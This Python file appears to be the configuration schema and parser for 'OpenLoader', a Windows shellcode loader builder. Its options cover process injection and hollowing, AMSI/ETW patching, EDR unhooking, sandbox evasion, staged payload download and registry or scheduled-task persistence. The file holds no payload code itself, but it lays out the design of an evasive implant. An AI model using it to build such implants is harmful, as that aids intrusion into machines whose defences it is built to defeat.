from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, Union

_PERM_MAP = {
    "RWX": "PAGE_EXECUTE_READWRITE",
    "RX":  "PAGE_EXECUTE_READ",
    "RW":  "PAGE_READWRITE",
    "R":   "PAGE_READONLY",
    "X":   "PAGE_EXECUTE",
    "NONE": "PAGE_NOACCESS",
}

_val_perm = set(_PERM_MAP.keys())
_val_obf = {"aes", "xor", "none", "chacha20", "rc4"}
_val_inj = {"module_stomping", "section_mapping", "thread_hijacking", "process_hollowing"}
_val_out = {"exe", "bin"}
_val_sub = {"gui", "console"}
_val_sd   = {0, 1}
_val_fmt  = {"bin", "dll", "pe"}
_val_proto = {"http", "dns", "icmp", "smb"}
_val_dns  = {"txt", "a", "mx", "null"}
_val_trig = {"after_exec", "on_detection", "on_sleep"}
_val_pers = {"registry", "scheduled_task", "wmi", "startup_folder"}
_val_enc  = {"xor", "aes", "chacha20", "rc4"}
_val_ksrc = {"random", "fixed", "derived"}
_val_log  = {"none", "error", "info", "trace"}


@dataclass
class SectionPerm:
    text: str = "RX"
    data: str = "RW"
    rdata: str = "RX"
    pdata: str = "RX"
    payload: str = "RWX"


@dataclass
class InjectionConfig:
    method: str = "module_stomping"
    dll: str = "ntdll.dll"
    pid: int = 0
    alloc: str = "RWX"
    exec: str = "RX"
    prefix: str = "\\KnownDlls\\"
    hollow_path: str = "C:\\Windows\\System32\\rundll32.exe"


@dataclass
class EvasionConfig:
    amsi: bool = True
    etw: bool = True
    stack: bool = True
    spoof_depth: int = 4
    junk: bool = True
    obfuscate: bool = True
    self_del: bool = False
    self_del_method: int = 0
    self_del_handle: int = 4
    obf_key: int = 0x9A
    retry_count: int = 3
    retry_delay_ms: int = 2000
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    download_buf: int = 8192


@dataclass
class AntiDebugConfig:
    peb: bool = True
    timing: bool = True
    hwbp: bool = True
    sandbox: bool = True
    min_cpu: int = 2
    min_ram_mb: int = 2048
    min_disk_gb: int = 60
    min_uptime_min: int = 30
    delayed_ms: int = 5000
    delay_jitter: int = 30
    hammer: int = 10


@dataclass
class SleepConfig:
    enabled: bool = True
    ms: int = 5000
    jitter: int = 30
    obfuscate: str = "aes"


# ---- P0: Staged Loader (extended) ----
@dataclass
class StageDef:
    url: str = ""
    decrypt_key: str = ""
    algo: str = "aes"
    inject_method: str = ""
    wait_ms: int = 0


@dataclass
class PayloadConfig:
    kind: str = "stageless"
    file: str = ""
    url: str = ""
    max_size_mb: int = 10
    timeout_sec: int = 30
    proxy: str = ""
    format: str = "bin"
    dll_export: str = "DllMain"
    dll_args: str = ""
    stage_url: str = ""
    stage_fallback_urls: tuple = ()
    stage_aes_key: str = ""
    stage_aes_iv: str = ""
    stage_retry: int = 3
    stage_retry_delay_ms: int = 2000
    stage_user_agent: str = "Mozilla/5.0"
    stage_headers: dict = field(default_factory=dict)
    stage_verify_cert: bool = False
    stage_max_size_mb: int = 50
    stage_timeout_sec: int = 30
    stage_proxy: str = ""
    stage_fingerprint: str = ""
    stages: list = field(default_factory=list)


# ---- P0: Reflective DLL ----
@dataclass
class ReflectiveConfig:
    clear_headers: bool = True
    resolve_imports: bool = True
    process_relocs: bool = True
    enable_tls: bool = True


# ---- P1: Process Migration ----
@dataclass
class MigrationConfig:
    enabled: bool = False
    target_process: str = "explorer.exe"
    target_pid: int = 0
    method: str = "module_stomping"
    trigger: str = "after_exec"
    retry_count: int = 3
    self_delete_after: bool = False


# ---- P2: Persistence ----
@dataclass
class PersistenceConfig:
    enabled: bool = False
    method: str = "registry"
    key: str = "OpenLoader"
    path: str = ""
    hide_file: bool = True
    delay_minutes: int = 10
    max_runs: int = 0


# ---- P2: Custom Network Protocols ----
@dataclass
class NetworkConfig:
    protocol: str = "http"
    dns_server: str = "8.8.8.8"
    dns_domain: str = ""
    dns_type: str = "txt"
    icmp_identifier: int = 0x1234
    smb_share: str = ""
    smb_username: str = ""
    smb_password: str = ""


# ---- P1: EDR / Anti-EDR ----
@dataclass
class EDRConfig:
    delay_api_calls: bool = True
    call_spoofing: bool = True
    rop_chain: bool = False
    syscall_indirect: bool = True
    patch_etw: bool = True
    patch_amsi: bool = True
    bypass_userland_hooks: bool = True
    unhook_dlls: tuple = ()
    syscall_whitelist: tuple = ()


# ---- P3: Logging & Debug ----
@dataclass
class DebugConfig:
    log_level: str = "none"
    log_file: str = ""
    log_console: bool = False
    syscall_trace: bool = False
    break_on_entry: bool = False


# ---- P3: Advanced Encryption ----
@dataclass
class EncryptionConfig:
    algo: str = "xor"
    key_source: str = "random"
    fixed_key: str = ""
    derived_from: str = ""
    iv: str = ""
    rounds: int = 1


# ---- PE / Compiler / Output (unchanged) ----
@dataclass
class PEConfig:
    subsystem: str = "gui"
    sections: SectionPerm = field(default_factory=SectionPerm)
    rename_sections: bool = True
    section_list: tuple = (
        ".text", ".data", ".rdata", ".pdata", ".xdata", ".bss", ".idata", ".edata"
    )


@dataclass
class CompilerConfig:
    cc: str = "x86_64-w64-mingw32-g++"
    flags: str = "-std=gnu++20 -O3 -Wall -s -fno-ident -lkernel32 -static-libgcc -static-libstdc++ -static -mwindows"


@dataclass
class OutputConfig:
    path: str = "output/agent.exe"
    type: str = "exe"


@dataclass
class ExtensionDef:
    name: str = ""
    path: str = ""
    enabled: bool = True
    compile_after: bool = False
    inject_to: str = "loader.cpp"
    position: str = "after_evasion"
    config: dict = field(default_factory=dict)


@dataclass
class Profile:
    meta_name: str = "Agent"
    meta_ver: str = "1.0"
    payload: PayloadConfig = field(default_factory=PayloadConfig)
    pe: PEConfig = field(default_factory=PEConfig)
    injection: InjectionConfig = field(default_factory=InjectionConfig)
    evasion: EvasionConfig = field(default_factory=EvasionConfig)
    anti_debug: AntiDebugConfig = field(default_factory=AntiDebugConfig)
    sleep: SleepConfig = field(default_factory=SleepConfig)
    reflective: ReflectiveConfig = field(default_factory=ReflectiveConfig)
    migration: MigrationConfig = field(default_factory=MigrationConfig)
    persistence: PersistenceConfig = field(default_factory=PersistenceConfig)
    network: NetworkConfig = field(default_factory=NetworkConfig)
    edr: EDRConfig = field(default_factory=EDRConfig)
    debug: DebugConfig = field(default_factory=DebugConfig)
    encryption: EncryptionConfig = field(default_factory=EncryptionConfig)
    compiler: CompilerConfig = field(default_factory=CompilerConfig)
    output: OutputConfig = field(default_factory=OutputConfig)
    extensions: list[ExtensionDef] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Strict validators
# ---------------------------------------------------------------------------

class ConfigError(ValueError):
    pass


def _assert_bool(v: object, path: str) -> bool:
    if isinstance(v, bool): return v
    if isinstance(v, str) and v.strip().lower() in ("true", "1", "yes"): return True
    if isinstance(v, str) and v.strip().lower() in ("false", "0", "no"): return False
    if isinstance(v, int) and v in (0, 1): return bool(v)
    raise ConfigError(f"{path}: expected bool, got {type(v).__name__}: {v!r}")


def _assert_int(v: object, path: str, lo: int = 0, hi: int = 2**31 - 1) -> int:
    try:
        x = int(v)
    except (TypeError, ValueError):
        raise ConfigError(f"{path}: expected int, got {type(v).__name__}: {v!r}")
    if not (lo <= x <= hi):
        raise ConfigError(f"{path}: value {x} out of range [{lo}, {hi}]")
    return x


def _assert_str(v: object, path: str) -> str:
    if not isinstance(v, str) or not v.strip():
        raise ConfigError(f"{path}: expected non-empty string, got {type(v).__name__}: {v!r}")
    return v.strip()


def _assert_one_of(v: object, path: str, ok: set) -> str:
    s = _assert_str(v, path)
    if s not in ok:
        raise ConfigError(f"{path}: '{s}' not in allowed values {sorted(ok)}")
    return s


def _assert_perm(v: object, path: str) -> str:
    return _assert_one_of(v, path, _val_perm)


def _assert_str_list(v: object, path: str) -> tuple:
    if not isinstance(v, list):
        raise ConfigError(f"{path}: expected array, got {type(v).__name__}")
    return tuple(_assert_str(x, f"{path}[{i}]") for i, x in enumerate(v))


def _assert_hex(v: object, path: str, byte_len: int = 0) -> str:
    s = _assert_str(v, path)
    try:
        b = bytes.fromhex(s)
    except ValueError:
        raise ConfigError(f"{path}: invalid hex string: {s!r}")
    if byte_len > 0 and len(b) != byte_len:
        raise ConfigError(f"{path}: expected {byte_len} bytes, got {len(b)}")
    return s


# ---------------------------------------------------------------------------
# Parsers
# ---------------------------------------------------------------------------

def _parse_sections(raw: object, path: str) -> SectionPerm:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return SectionPerm(
        text=_assert_perm(raw.get(".text", "RX"),         f"{path}.text"),
        data=_assert_perm(raw.get(".data", "RW"),          f"{path}.data"),
        rdata=_assert_perm(raw.get(".rdata", "RX"),       f"{path}.rdata"),
        pdata=_assert_perm(raw.get(".pdata", "RX"),       f"{path}.pdata"),
        payload=_assert_perm(raw.get(".payload", "RWX"),  f"{path}.payload"),
    )


def _parse_stages(raw: object, path: str) -> list:
    if not isinstance(raw, list):
        raise ConfigError(f"{path}: expected array, got {type(raw).__name__}")
    stages = []
    for i, item in enumerate(raw):
        if not isinstance(item, dict):
            raise ConfigError(f"{path}[{i}]: expected object")
        stages.append(StageDef(
            url=_assert_str(item.get("url", ""), f"{path}[{i}].url"),
            decrypt_key=_assert_str(item.get("decrypt_key", ""), f"{path}[{i}].decrypt_key"),
            algo=_assert_one_of(item.get("algo", "aes"), f"{path}[{i}].algo", {"aes", "xor", "chacha20", "rc4"}),
            inject_method=_assert_str(item.get("inject_method", ""), f"{path}[{i}].inject_method"),
            wait_ms=_assert_int(item.get("wait_ms", 0), f"{path}[{i}].wait_ms", 0),
        ))
    return stages


def _parse_payload(raw: object, path: str) -> PayloadConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    c = PayloadConfig()
    c.kind   = _assert_one_of(raw.get("type", "stageless"), f"{path}.type", {"stageless", "staged"})
    if raw.get("file") is not None:
        c.file = _assert_str(raw["file"], f"{path}.file")
    if raw.get("url") is not None:
        c.url = _assert_str(raw["url"], f"{path}.url")
    c.max_size_mb  = _assert_int(raw.get("max_size_mb", 10),   f"{path}.max_size_mb", 1)
    c.timeout_sec  = _assert_int(raw.get("timeout_sec", 30),   f"{path}.timeout_sec", 1)
    if raw.get("proxy") is not None:
        c.proxy = _assert_str(raw["proxy"], f"{path}.proxy")
    c.format = _assert_one_of(raw.get("format", "bin"), f"{path}.format", _val_fmt)
    if raw.get("dll_export") is not None:
        c.dll_export = _assert_str(raw["dll_export"], f"{path}.dll_export")
    if raw.get("dll_args") is not None:
        c.dll_args = _assert_str(raw["dll_args"], f"{path}.dll_args")
    if raw.get("stage_url") is not None:
        c.stage_url = _assert_str(raw["stage_url"], f"{path}.stage_url")
    if raw.get("stage_fallback_urls") is not None:
        c.stage_fallback_urls = _assert_str_list(raw["stage_fallback_urls"], f"{path}.stage_fallback_urls")
    if raw.get("stage_aes_key") is not None:
        c.stage_aes_key = _assert_hex(raw["stage_aes_key"], f"{path}.stage_aes_key", 16)
    if raw.get("stage_aes_iv") is not None:
        c.stage_aes_iv = _assert_hex(raw["stage_aes_iv"], f"{path}.stage_aes_iv", 16)
    c.stage_retry = _assert_int(raw.get("stage_retry", 3), f"{path}.stage_retry", 0, 100)
    c.stage_retry_delay_ms = _assert_int(raw.get("stage_retry_delay_ms", 2000), f"{path}.stage_retry_delay_ms", 0, 60000)
    if raw.get("stage_user_agent") is not None:
        c.stage_user_agent = _assert_str(raw["stage_user_agent"], f"{path}.stage_user_agent")
    if raw.get("stage_headers") is not None:
        sh = raw["stage_headers"]
        if not isinstance(sh, dict):
            raise ConfigError(f"{path}.stage_headers: expected object")
        c.stage_headers = {str(k): str(v) for k, v in sh.items()}
    c.stage_verify_cert = _assert_bool(raw.get("stage_verify_cert", False), f"{path}.stage_verify_cert")
    c.stage_max_size_mb = _assert_int(raw.get("stage_max_size_mb", 50), f"{path}.stage_max_size_mb", 1)
    c.stage_timeout_sec = _assert_int(raw.get("stage_timeout_sec", 30), f"{path}.stage_timeout_sec", 1)
    if raw.get("stage_proxy") is not None:
        c.stage_proxy = _assert_str(raw["stage_proxy"], f"{path}.stage_proxy")
    if raw.get("stage_fingerprint") is not None:
        c.stage_fingerprint = _assert_hex(raw["stage_fingerprint"], f"{path}.stage_fingerprint", 32)
    if raw.get("stages") is not None:
        c.stages = _parse_stages(raw["stages"], f"{path}.stages")
    if c.kind == "staged" and not c.url and not c.stage_url:
        raise ConfigError(f"{path}: staged payload requires 'url' or 'stage_url'")
    if c.kind == "stageless" and not c.file:
        raise ConfigError(f"{path}: stageless payload requires 'file'")
    return c


def _parse_injection(raw: object, path: str) -> InjectionConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return InjectionConfig(
        method=_assert_one_of(raw.get("method", "module_stomping"), f"{path}.method", _val_inj),
        dll=_assert_str(raw.get("dll", "ntdll.dll"), f"{path}.dll"),
        pid=_assert_int(raw.get("pid", 0), f"{path}.pid", 0),
        alloc=_assert_perm(raw.get("alloc", "RWX"), f"{path}.alloc"),
        exec=_assert_perm(raw.get("exec", "RX"), f"{path}.exec"),
        prefix=_assert_str(raw.get("prefix", "\\KnownDlls\\"), f"{path}.prefix"),
        hollow_path=_assert_str(raw.get("hollow_path", "C:\\Windows\\System32\\rundll32.exe"), f"{path}.hollow_path"),
    )


def _parse_evasion(raw: object, path: str) -> EvasionConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return EvasionConfig(
        amsi=_assert_bool(raw.get("amsi", True), f"{path}.amsi"),
        etw=_assert_bool(raw.get("etw", True), f"{path}.etw"),
        stack=_assert_bool(raw.get("stack", True), f"{path}.stack"),
        spoof_depth=_assert_int(raw.get("spoof_depth", 4), f"{path}.spoof_depth", 1, 64),
        junk=_assert_bool(raw.get("junk", True), f"{path}.junk"),
        obfuscate=_assert_bool(raw.get("obfuscate", True), f"{path}.obfuscate"),
        self_del=_assert_bool(raw.get("self_del", False), f"{path}.self_del"),
        self_del_method=_assert_int(raw.get("self_del_method", 0), f"{path}.self_del_method", 0, 1),
        self_del_handle=_assert_int(raw.get("self_del_handle", 4), f"{path}.self_del_handle", 0, 65535),
        obf_key=_assert_int(raw.get("obf_key", 0x9A), f"{path}.obf_key", 1, 255),
        retry_count=_assert_int(raw.get("retry_count", 3), f"{path}.retry_count", 0, 100),
        retry_delay_ms=_assert_int(raw.get("retry_delay_ms", 2000), f"{path}.retry_delay_ms", 0, 60000),
        user_agent=_assert_str(raw.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"), f"{path}.user_agent"),
        download_buf=_assert_int(raw.get("download_buf", 8192), f"{path}.download_buf", 256, 1048576),
    )


def _parse_anti_debug(raw: object, path: str) -> AntiDebugConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return AntiDebugConfig(
        peb=_assert_bool(raw.get("peb", True), f"{path}.peb"),
        timing=_assert_bool(raw.get("timing", True), f"{path}.timing"),
        hwbp=_assert_bool(raw.get("hwbp", True), f"{path}.hwbp"),
        sandbox=_assert_bool(raw.get("sandbox", True), f"{path}.sandbox"),
        min_cpu=_assert_int(raw.get("min_cpu", 2), f"{path}.min_cpu", 1),
        min_ram_mb=_assert_int(raw.get("min_ram_mb", 2048), f"{path}.min_ram_mb", 256),
        min_disk_gb=_assert_int(raw.get("min_disk_gb", 60), f"{path}.min_disk_gb", 10),
        min_uptime_min=_assert_int(raw.get("min_uptime_min", 30), f"{path}.min_uptime_min", 0),
        delayed_ms=_assert_int(raw.get("delayed_ms", 5000), f"{path}.delayed_ms", 0),
        delay_jitter=_assert_int(raw.get("delay_jitter", 30), f"{path}.delay_jitter", 0, 100),
        hammer=_assert_int(raw.get("hammer", 10), f"{path}.hammer", 0, 10000),
    )


def _parse_sleep(raw: object, path: str) -> SleepConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return SleepConfig(
        enabled=_assert_bool(raw.get("enabled", True), f"{path}.enabled"),
        ms=_assert_int(raw.get("ms", 5000), f"{path}.ms", 0, 86400000),
        jitter=_assert_int(raw.get("jitter", 30), f"{path}.jitter", 0, 100),
        obfuscate=_assert_one_of(raw.get("obfuscate", "aes"), f"{path}.obfuscate", _val_obf),
    )


def _parse_reflective(raw: object, path: str) -> ReflectiveConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return ReflectiveConfig(
        clear_headers=_assert_bool(raw.get("clear_headers", True), f"{path}.clear_headers"),
        resolve_imports=_assert_bool(raw.get("resolve_imports", True), f"{path}.resolve_imports"),
        process_relocs=_assert_bool(raw.get("process_relocs", True), f"{path}.process_relocs"),
        enable_tls=_assert_bool(raw.get("enable_tls", True), f"{path}.enable_tls"),
    )


def _parse_migration(raw: object, path: str) -> MigrationConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return MigrationConfig(
        enabled=_assert_bool(raw.get("enabled", False), f"{path}.enabled"),
        target_process=_assert_str(raw.get("target_process", "explorer.exe"), f"{path}.target_process"),
        target_pid=_assert_int(raw.get("target_pid", 0), f"{path}.target_pid", 0),
        method=_assert_one_of(raw.get("method", "module_stomping"), f"{path}.method", _val_inj),
        trigger=_assert_one_of(raw.get("trigger", "after_exec"), f"{path}.trigger", _val_trig),
        retry_count=_assert_int(raw.get("retry_count", 3), f"{path}.retry_count", 0, 100),
        self_delete_after=_assert_bool(raw.get("self_delete_after", False), f"{path}.self_delete_after"),
    )


def _parse_persistence(raw: object, path: str) -> PersistenceConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return PersistenceConfig(
        enabled=_assert_bool(raw.get("enabled", False), f"{path}.enabled"),
        method=_assert_one_of(raw.get("method", "registry"), f"{path}.method", _val_pers),
        key=_assert_str(raw.get("key", "OpenLoader"), f"{path}.key"),
        path=_assert_str(raw.get("path", ""), f"{path}.path") if raw.get("path") else "",
        hide_file=_assert_bool(raw.get("hide_file", True), f"{path}.hide_file"),
        delay_minutes=_assert_int(raw.get("delay_minutes", 10), f"{path}.delay_minutes", 0),
        max_runs=_assert_int(raw.get("max_runs", 0), f"{path}.max_runs", 0),
    )


def _parse_network(raw: object, path: str) -> NetworkConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return NetworkConfig(
        protocol=_assert_one_of(raw.get("protocol", "http"), f"{path}.protocol", _val_proto),
        dns_server=_assert_str(raw.get("dns_server", "8.8.8.8"), f"{path}.dns_server"),
        dns_domain=_assert_str(raw.get("dns_domain", ""), f"{path}.dns_domain") if raw.get("dns_domain") else "",
        dns_type=_assert_one_of(raw.get("dns_type", "txt"), f"{path}.dns_type", _val_dns),
        icmp_identifier=_assert_int(raw.get("icmp_identifier", 0x1234), f"{path}.icmp_identifier", 0, 65535),
        smb_share=_assert_str(raw.get("smb_share", ""), f"{path}.smb_share") if raw.get("smb_share") else "",
        smb_username=_assert_str(raw.get("smb_username", ""), f"{path}.smb_username") if raw.get("smb_username") else "",
        smb_password=_assert_str(raw.get("smb_password", ""), f"{path}.smb_password") if raw.get("smb_password") else "",
    )


def _parse_edr(raw: object, path: str) -> EDRConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    unhook = raw.get("unhook_dlls")
    swl = raw.get("syscall_whitelist")
    return EDRConfig(
        delay_api_calls=_assert_bool(raw.get("delay_api_calls", True), f"{path}.delay_api_calls"),
        call_spoofing=_assert_bool(raw.get("call_spoofing", True), f"{path}.call_spoofing"),
        rop_chain=_assert_bool(raw.get("rop_chain", False), f"{path}.rop_chain"),
        syscall_indirect=_assert_bool(raw.get("syscall_indirect", True), f"{path}.syscall_indirect"),
        patch_etw=_assert_bool(raw.get("patch_etw", True), f"{path}.patch_etw"),
        patch_amsi=_assert_bool(raw.get("patch_amsi", True), f"{path}.patch_amsi"),
        bypass_userland_hooks=_assert_bool(raw.get("bypass_userland_hooks", True), f"{path}.bypass_userland_hooks"),
        unhook_dlls=_assert_str_list(unhook, f"{path}.unhook_dlls") if unhook is not None else (),
        syscall_whitelist=tuple(_assert_int(x, f"{path}.syscall_whitelist") for x in swl) if swl is not None else (),
    )


def _parse_debug(raw: object, path: str) -> DebugConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return DebugConfig(
        log_level=_assert_one_of(raw.get("log_level", "none"), f"{path}.log_level", _val_log),
        log_file=_assert_str(raw.get("log_file", ""), f"{path}.log_file") if raw.get("log_file") else "",
        log_console=_assert_bool(raw.get("log_console", False), f"{path}.log_console"),
        syscall_trace=_assert_bool(raw.get("syscall_trace", False), f"{path}.syscall_trace"),
        break_on_entry=_assert_bool(raw.get("break_on_entry", False), f"{path}.break_on_entry"),
    )


def _parse_encryption(raw: object, path: str) -> EncryptionConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return EncryptionConfig(
        algo=_assert_one_of(raw.get("algo", "xor"), f"{path}.algo", _val_enc),
        key_source=_assert_one_of(raw.get("key_source", "random"), f"{path}.key_source", _val_ksrc),
        fixed_key=_assert_hex(raw["fixed_key"], f"{path}.fixed_key") if raw.get("fixed_key") else "",
        derived_from=_assert_str(raw.get("derived_from", ""), f"{path}.derived_from") if raw.get("derived_from") else "",
        iv=_assert_hex(raw["iv"], f"{path}.iv") if raw.get("iv") else "",
        rounds=_assert_int(raw.get("rounds", 1), f"{path}.rounds", 1, 100),
    )


def _parse_pe(raw: object, path: str) -> PEConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    subsys = _assert_one_of(raw.get("subsystem", "gui"), f"{path}.subsystem", _val_sub)
    sections = _parse_sections(raw.get("sections", {}), f"{path}.sections")
    rename = _assert_bool(raw.get("rename_sections", True), f"{path}.rename_sections")
    sl = raw.get("section_list")
    section_list: tuple = ()
    if sl is not None:
        if not isinstance(sl, list) or not all(isinstance(x, str) for x in sl):
            raise ConfigError(f"{path}.section_list: expected array of strings")
        section_list = tuple(sl)
    else:
        section_list = PEConfig.section_list
    return PEConfig(subsystem=subsys, sections=sections, rename_sections=rename, section_list=section_list)


def _parse_compiler(raw: object, path: str) -> CompilerConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return CompilerConfig(
        cc=_assert_str(raw.get("cc", CompilerConfig.cc), f"{path}.cc"),
        flags=_assert_str(raw.get("flags", CompilerConfig.flags), f"{path}.flags"),
    )


def _parse_output(raw: object, path: str) -> OutputConfig:
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: expected object, got {type(raw).__name__}")
    return OutputConfig(
        path=_assert_str(raw.get("path", OutputConfig(path="output/agent.exe").path), f"{path}.path"),
        type=_assert_one_of(raw.get("type", "exe"), f"{path}.type", _val_out),
    )


def _parse_extensions(raw: object, path: str) -> list[ExtensionDef]:
    if not isinstance(raw, list):
        raise ConfigError(f"{path}: expected array, got {type(raw).__name__}")
    exts: list[ExtensionDef] = []
    for i, item in enumerate(raw):
        if not isinstance(item, dict):
            raise ConfigError(f"{path}[{i}]: expected object")
        cfg: dict = {}
        raw_cfg = item.get("config", {})
        if not isinstance(raw_cfg, dict):
            raise ConfigError(f"{path}[{i}].config: expected object")
        cfg = {str(k): str(v) for k, v in raw_cfg.items()}
        exts.append(ExtensionDef(
            name=_assert_str(item.get("name", ""), f"{path}[{i}].name"),
            path=_assert_str(item.get("path", ""), f"{path}[{i}].path"),
            enabled=_assert_bool(item.get("enabled", True), f"{path}[{i}].enabled"),
            compile_after=_assert_bool(item.get("compile_after", False), f"{path}[{i}].compile_after"),
            inject_to=_assert_str(item.get("inject_to", "loader.cpp"), f"{path}[{i}].inject_to"),
            position=_assert_str(item.get("position", "after_evasion"), f"{path}[{i}].position"),
            config=cfg,
        ))
    return exts


def parse(raw: dict) -> Profile:
    if not isinstance(raw, dict):
        raise ConfigError("root: expected JSON object")

    schema = raw.get("$schema")
    if schema and schema != "openloader-1.0":
        pass

    meta_raw = raw.get("meta")
    meta_name: str = "Agent"
    meta_ver: str = "1.0"
    if meta_raw is not None:
        if not isinstance(meta_raw, dict):
            raise ConfigError("meta: expected object")
        meta_name = _assert_str(meta_raw.get("name", "Agent"), "meta.name")
        meta_ver = _assert_str(meta_raw.get("version", "1.0"), "meta.version")

    p = _parse_payload(raw.get("payload", {}), "payload")

    known = {"$schema", "meta", "payload", "pe", "injection", "evasion",
             "anti_debug", "sleep", "reflective", "migration", "persistence",
             "network", "edr", "debug", "encryption", "compiler", "output", "extensions"}

    return Profile(
        meta_name=meta_name,
        meta_ver=meta_ver,
        payload=p,
        pe=_parse_pe(raw.get("pe", {}), "pe"),
        injection=_parse_injection(raw.get("injection", {}), "injection"),
        evasion=_parse_evasion(raw.get("evasion", {}), "evasion"),
        anti_debug=_parse_anti_debug(raw.get("anti_debug", {}), "anti_debug"),
        sleep=_parse_sleep(raw.get("sleep", {}), "sleep"),
        reflective=_parse_reflective(raw.get("reflective", {}), "reflective"),
        migration=_parse_migration(raw.get("migration", {}), "migration"),
        persistence=_parse_persistence(raw.get("persistence", {}), "persistence"),
        network=_parse_network(raw.get("network", {}), "network"),
        edr=_parse_edr(raw.get("edr", {}), "edr"),
        debug=_parse_debug(raw.get("debug", {}), "debug"),
        encryption=_parse_encryption(raw.get("encryption", {}), "encryption"),
        compiler=_parse_compiler(raw.get("compiler", {}), "compiler"),
        output=_parse_output(raw.get("output", {}), "output"),
        extensions=_parse_extensions(raw.get("extensions", []), "extensions"),
    )


def parse_file(path: str) -> Profile:
    fp = Path(path)
    if not fp.exists():
        raise FileNotFoundError(f"profile not found: {path}")
    with open(fp) as f:
        return parse(json.load(f))
